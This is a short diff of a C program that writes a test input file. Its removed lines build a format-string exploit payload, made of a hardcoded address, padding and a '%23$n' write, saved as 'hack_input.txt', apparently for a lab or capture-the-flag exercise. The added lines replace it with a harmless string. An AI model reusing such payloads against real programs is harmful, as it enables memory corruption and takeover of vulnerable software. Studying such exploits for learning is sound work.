@@ -4,16 +4,10 @@
 int main()
 {
     // Define the buffer containing the data you want to write to the file
-    char buffer[80];
-
-    strcpy(buffer, "\x2a\xa0\x04\x08");
-    strcat(buffer, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
-    strcat(buffer, "%23$n");
-    strcat(buffer, "\n");
-    strcat(buffer, "WilliamL");
+    char buffer[] = "Benign Lol\nWilliam";
 
     // Open a file for writing (or create it if it doesn't exist)
-    FILE *file = fopen("hack_input.txt", "w");
+    FILE *file = fopen("benign_input.txt", "w");
 
     // Check if the file was opened successfully
     if (file == NULL)
